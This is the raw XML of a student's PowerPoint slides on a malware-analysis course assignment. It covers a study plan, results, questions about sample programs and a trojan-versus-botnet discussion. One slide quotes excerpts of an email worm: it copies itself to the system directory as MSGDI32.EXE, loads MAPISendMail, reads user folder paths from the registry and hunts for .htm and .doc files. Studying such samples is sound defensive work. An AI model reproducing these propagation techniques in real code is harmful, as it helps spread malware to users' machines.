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4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8"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="423" r:id="rId2"/>
    <p:sldId id="424" r:id="rId3"/>
    <p:sldId id="425" r:id="rId4"/>
    <p:sldId id="428" r:id="rId5"/>
    <p:sldId id="429" r:id="rId6"/>
    <p:sldId id="427" r:id="rId7"/>
  </p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:custDataLst>
    <p:tags r:id="rId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7"/>
    <p:restoredTop sz="96322"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="92" d="100"/>
          <a:sy n="92" d="100"/>
        </p:scale>
        <p:origin x="65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A6D457-D595-D74A-B943-9BE89BF18156}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12/28/2023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A9FDB8-D5FC-364C-AEB4-B7B45138951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01770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14474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12/28/2023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12/28/2023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12/28/2023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12/28/2023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12/28/2023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12/28/2023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12/28/2023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12/28/2023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12/28/2023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12/28/2023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12/28/2023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 userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm flipV="1">
            <a:off x="0" y="6487888"/>
            <a:ext cx="12192000" cy="370112"/>
            <a:chOff x="0" y="-40730"/>
            <a:chExt cx="12192000" cy="370112"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="矩形 5"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="-40730"/>
              <a:ext cx="12192000" cy="37011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 R" panose="00020600040101010101" pitchFamily="18" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="矩形 6"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="-40730"/>
              <a:ext cx="12192000" cy="285614"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="005C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 R" panose="00020600040101010101" pitchFamily="18" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="菱形 95"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="600451" y="370197"/>
            <a:ext cx="372167" cy="372166"/>
          </a:xfrm>
          <a:prstGeom prst="diamond">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1">
              <a:lumMod val="85000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="005C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 R" panose="00020600040101010101" pitchFamily="18" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="菱形 96"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356797" y="312627"/>
            <a:ext cx="487308" cy="487307"/>
          </a:xfrm>
          <a:prstGeom prst="diamond">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="005CA2"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="004E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 R" panose="00020600040101010101" pitchFamily="18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0" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1078230" y="357505"/>
            <a:ext cx="5685155" cy="4419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solidFill>
                  <a:srgbClr val="005CA2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974146-AD47-D54A-ADAE-EACD76BE342A}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12/28/2023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hyperlink" Target="https://docs.qq.com/sheet/DTUlvbnJxVWRIaU5h?tab=BB08J2&amp;_t=1689300733234&amp;u=ceda27097b74424b8fb632b77161a98a" TargetMode="Externa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5" y="97155"/>
            <a:ext cx="3154045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Planed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32765" y="1153160"/>
            <a:ext cx="5132705" cy="1838325"/>
            <a:chOff x="839" y="1816"/>
            <a:chExt cx="8083" cy="2895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3147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Planed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23"/>
              <a:ext cx="8083" cy="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600" dirty="0">
                  <a:hlinkClick r:id="rId6"/>
                </a:rPr>
                <a:t>Study Plan (qq.com)</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN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5" y="97155"/>
            <a:ext cx="3154045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Results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32765" y="1153160"/>
            <a:ext cx="5132705" cy="2275840"/>
            <a:chOff x="839" y="1816"/>
            <a:chExt cx="8083" cy="3584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3147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Results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401"/>
              <a:ext cx="8083" cy="2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There‘s still malware5 left to analyze, but I think it’s a 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bootnet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 plan to show you how I do the assignment4.</a:t>
              </a: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32765" y="1153160"/>
            <a:ext cx="5132705" cy="1898015"/>
            <a:chOff x="839" y="1816"/>
            <a:chExt cx="8083" cy="2989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Challenges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and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cs typeface="Palatino Linotype" panose="02040502050505030304" charset="0"/>
                </a:rPr>
                <a:t>solutions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23"/>
              <a:ext cx="8083" cy="2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What is this part for?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What are ‘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’ and ‘p’ used to judge?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It is malware1.c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-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is used to determine whether the Archiver.exe is in the specified directory, but -p is used to determine what?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endParaRPr lang="zh-CN" alt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BAB3CF8-2F00-B712-D1C6-87EECE7C24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1020" y="878774"/>
            <a:ext cx="6526530" cy="491044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32765" y="1153160"/>
            <a:ext cx="5132705" cy="1898015"/>
            <a:chOff x="839" y="1816"/>
            <a:chExt cx="8083" cy="2989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Challenges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and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cs typeface="Palatino Linotype" panose="02040502050505030304" charset="0"/>
                </a:rPr>
                <a:t>solutions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23"/>
              <a:ext cx="8083" cy="2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Why is the program used for comparison different from the program used for self-replication?</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr>
                <a:buClr>
                  <a:srgbClr val="00B0F0"/>
                </a:buClr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 guess it is used to confuse the victim.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the welcome function is harmless.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It is malware3.c</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" alt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0D68A72-6722-40E8-79BC-1173BF62834E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459179" y="2927268"/>
            <a:ext cx="11732821" cy="19205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highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>strcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>sysdr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>,"\\MSGDI32.EXE");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>//to judge the target file is under the system directory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>if((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lstrcmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>filename,sysdr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>))!=0) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	Welcome();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>else</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		//if find the MSGDI32.EXE successfully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hMAPI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>LoadLibrary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("MAPI32.DLL");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	(FARPROC &amp;)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mSendMail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>GetProcAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>hMAPI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>MAPISendMail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>");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RegOpenKeyEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(HKEY_USERS,SHFolder,0,KEY_QUERY_VALUE,&amp;hReg);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RegQueryValueEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hReg,"Desktop",0,&amp;type,desktop,&amp;sizdesktop);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RegQueryValueEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hReg,"Favorites",0,&amp;type,favoris,&amp;sizfavoris);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RegQueryValueEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hReg,"Personal",0,&amp;type,personal,&amp;sizpersonal);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RegQueryValueEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hReg,"Cache",0,&amp;type,cache,&amp;sizcache);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RegCloseKey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>hReg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>);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GetWindowsDirectory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>((char *)winhtm,100);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>//connect the Internet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>asm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>call	@wininet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>db</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	"WININET.DLL",0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>@wininet:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>call	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>LoadLibrary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>test	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>eax,eax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>jz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>end_asm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>mov	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ebp,eax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>call	@inetconnect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>db</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	"InternetGetConnectedState",0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>@inetconnect:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>push	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>call	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>GetProcAddress</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>test	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>eax,eax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>jz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>end_wininet</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>mov	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>edi,eax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>verf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>push	0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>push	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Tmp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>call	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>edi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>dec	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>eax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>jnz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>verf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/>
              <a:t>end_wininet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>push	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>call	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>FreeLibrary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>end_asm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>jmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>end_all_asm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/>
              <a:t>Tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	dd 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>end_all_asm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>//*********************************************************************//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FindFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(desktop,"*.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>htm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>");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FindFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>favoris</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>,"*.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>*");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FindFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(personal,"*.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>*");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FindFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(personal,"*.doc");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FindFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>winhtm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>,".</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>*");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FindFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(cache,".</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>*");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>//*****************************************************************//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FreeLibrary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>hMAPI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	//***************************************************************//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FeedBack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	//***************************************************************//</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>strcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>sysdir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>,"\\MsGDI32.exe");</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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5943573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32765" y="1153160"/>
            <a:ext cx="5132705" cy="3425163"/>
            <a:chOff x="839" y="1816"/>
            <a:chExt cx="8083" cy="3443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Challenges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and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cs typeface="Palatino Linotype" panose="02040502050505030304" charset="0"/>
                </a:rPr>
                <a:t>solutions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23"/>
              <a:ext cx="8083" cy="29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rgbClr val="FF0000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 can not make it clear that the malware4.c is  trojan horse or botnet.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</a:rPr>
                <a:t>Trojan horse and botnets have a lot in common when a server interacts with a single victim's computer.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</a:rPr>
                <a:t>I think a very important basis for distinguishing them is whether the attacker has set up a network with the victims’ computers.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</a:rPr>
                <a:t>Finally, I think the malware4.c is a trojan horse.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endParaRPr lang="zh-CN" alt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107011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5" y="97155"/>
            <a:ext cx="3154045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Plan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440690" y="1153160"/>
            <a:ext cx="5180330" cy="1654175"/>
            <a:chOff x="694" y="1816"/>
            <a:chExt cx="8158" cy="2605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3147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plan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694" y="2209"/>
              <a:ext cx="8083" cy="2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Final exam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endParaRPr lang="zh-CN" alt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WViYjA4YjczODZkNzY4ZmRmNjg2ZmVlYjE2OGMwNTAifQ=="/>
  <p:tag name="KSO_WPP_MARK_KEY" val="e6c85fa1-cd61-4d87-b6eb-0c65704176e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595</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>109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3" baseType="lpstr">
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Palatino Linotype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Zhong, Fangtian</dc:creator>
  <cp:lastModifiedBy>卓雲 钱</cp:lastModifiedBy>
  <cp:revision>25</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-09-21T15:51:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-12-28T00:51:56Z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CC2C0F941B7A40BB95BC861408F20AFB_12</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-11.1.0.14309</vt:lpwstr>
  </property>
</Properties>
</file>